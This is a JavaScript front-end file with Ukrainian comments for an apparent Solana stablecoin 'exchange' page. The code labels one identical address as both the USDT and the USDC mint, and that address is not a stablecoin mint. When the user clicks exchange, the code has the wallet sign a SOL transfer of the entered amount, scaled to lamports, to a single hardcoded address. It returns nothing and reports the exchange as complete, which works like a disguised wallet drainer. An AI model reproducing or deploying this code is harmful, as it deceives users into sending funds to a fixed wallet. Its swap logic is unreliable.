const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;

// Solana RPC (замініть на свій кастомний, якщо потрібно)
const endpoint = "https://api.mainnet-beta.solana.com";
const connection = new Connection(endpoint, "confirmed");

// Адреси гаманців
const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");

// UI Елементи
const connectWalletBtn = document.getElementById('connectWalletBtn');
const walletStatus = document.getElementById('walletStatus');
const exchangeBtn = document.getElementById('exchangeBtn');
const resultDiv = document.getElementById('result');
const amountInput = document.getElementById('amount');

// Підключення гаманця
let wallet = window.solana;

connectWalletBtn.addEventListener("click", async () => {
    if (!wallet) {
        alert("Будь ласка, встановіть Phantom Wallet або Solflare");
        return;
    }

    try {
        await wallet.connect();
        walletStatus.textContent = `Гаманець підключено: ${wallet.publicKey.toString()}`;
    } catch (err) {
        console.log("Помилка підключення:", err);
    }
});

// Перевірка балансу перед обміном
async function getTokenBalance(ownerAddress, mintAddress) {
    const body = {
        jsonrpc: "2.0",
        id: "1",
        method: "getTokenAccounts",
        params: {
            owner: ownerAddress.toString(),
            mint: mintAddress.toString(),
            page: 1,
            limit: 1
        }
    };

    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });

        const data = await response.json();
        if (data.result && data.result.items.length > 0) {
            return parseFloat(data.result.items[0].amount);
        } else {
            return 0;
        }
    } catch (error) {
        console.error("Помилка отримання балансу:", error);
        return 0;
    }
}

// Обмін токенів
exchangeBtn.addEventListener("click", async () => {
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0) {
        alert("Будь ласка, введіть коректну кількість USDT/USDC");
        return;
    }

    // Перевіряємо баланс USDT
    const balanceUSDT = await getTokenBalance(wallet.publicKey, USDT_MINT_ADDRESS);
    const balanceUSDC = await getTokenBalance(wallet.publicKey, USDC_MINT_ADDRESS);

    if (balanceUSDT < amount && balanceUSDC < amount) {
        alert("Недостатньо коштів для обміну!");
        return;
    }

    await exchangeTokens(wallet, amount);
});

// Функція для обміну USDT/USDC
async function exchangeTokens(wallet, amountInUSDT) {
    try {
        const transaction = new Transaction();
        const sender = wallet.publicKey;

        // Визначаємо, який токен є в користувача
        const hasUSDT = await getTokenBalance(sender, USDT_MINT_ADDRESS) >= amountInUSDT;
        const mintAddress = hasUSDT ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;

        const transferInstruction = SystemProgram.transfer({
            fromPubkey: sender,
            toPubkey: SPL_TOKEN_ADDRESS,
            lamports: amountInUSDT * 1000000000 // Конвертація
        });

        transaction.add(transferInstruction);

        const signature = await wallet.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signature.serialize());
        await connection.confirmTransaction(txid);

        console.log(`Транзакція успішно надіслана! TXID: ${txid}`);
        resultDiv.style.display = "block";
        resultDiv.textContent = `Обмін завершено! TXID: ${txid}`;
    } catch (err) {
        console.log("Помилка обміну:", err);
        resultDiv.style.display = "block";
        resultDiv.textContent = "Помилка при обміні. Спробуйте ще раз.";
    }
}

// Отримання активів власника
async function getAssetsByOwner(ownerAddress) {
    const body = {
        jsonrpc: "2.0",
        method: "getAssetsByOwner",
        params: {
            ownerAddress: ownerAddress.toString(),
            limit: 10,
            page: 1
        },
        id: 1
    };

    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });

        const data = await response.json();
        console.log("Активи власника:", data);
        return data.result;
    } catch (error) {
        console.error("Помилка отримання активів:", error);
    }
}

// Отримання історії транзакцій
async function getSignaturesForAssetV2(assetId) {
    const body = {
        jsonrpc: "2.0",
        id: "string",
        method: "getSignaturesForAssetV2",
        params: {
            id: assetId,
            page: 1,
            limit: 100
        }
    };

    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });

        const data = await response.json();
        console.log("Історія транзакцій:", data);
        return data.result;
    } catch (error) {
        console.error("Помилка отримання історії:", error);
    }
}


